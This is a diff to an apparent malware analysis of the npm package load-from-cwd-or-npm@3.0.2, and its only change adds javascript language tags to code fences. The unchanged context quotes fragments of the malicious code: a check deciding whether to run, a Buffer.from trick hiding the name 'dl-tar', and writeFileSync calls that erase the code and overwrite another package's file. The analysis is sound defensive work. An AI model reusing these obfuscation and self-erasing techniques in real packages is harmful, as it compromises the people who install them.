@@ -142,7 +142,7 @@ I've archived [complete copies of the packages I've identified including the mal
 The first version of the exploit, in `load-from-cwd-or-npm@3.0.2`, occurs in
 [lines 50 to 83 of index.js](https://gist.github.com/hdgarrood/358e98b5956e5f7f59c85c2e56534f2b#file-load-from-cwd-or-npm-3-0-2-js-L50-L83):
 
-```
+```javascript
   const tasks = [PassThrough];
 
   if (argLen === 2) {
@@ -217,7 +217,7 @@ the malicious code should run or not: if the exploit should be run, then
 `parent` will be `undefined`, but if it shouldn't, then it will be set to the
 string `"npm"`. We then have this if statement:
 
-```
+```javascript
     if (typeof parent !== 'string') {
       return results[2];
     }
@@ -230,7 +230,7 @@ malicious code is being run; note that there are no other references to
 The effect of this is that when we do `loadFromCwdOrNpm("request")`, we get the
 `PassThrough` constructor. So when we have code along the lines of
 
-```
+```javascript
 const request = loadFromCwdOrNpm("request");
 request("https://github.com/.../archive.tar.gz").pipe(...);
 ```
@@ -288,7 +288,7 @@ After the `do`-`while` loop, in the case where the exploit code is going to
 run, it first resolves the path of the `dl-tar` package on the local
 filesystem; note the use of `Buffer.from` to obscure this:
 
-```
+```javascript
 > Buffer.from([100, 108, 45, 116, 97, 114]).toString()
 'dl-tar'
 ```
@@ -296,7 +296,7 @@ filesystem; note the use of `Buffer.from` to obscure this:
 The file path of `index.js` from the `dl-tar` package will now be stored in the
 `px` variable. Then, we have this:
 
-```
+```javascript
   try {
     writeFileSync(
       __filename,
@@ -311,7 +311,7 @@ The file path of `index.js` from the `dl-tar` package will now be stored in the
 which rewrites the current file to remove the malicious code, presumably also
 in order to make this exploit harder to track down. Finally, we have this:
 
-```
+```javascript
   try {
     writeFileSync(
       px,
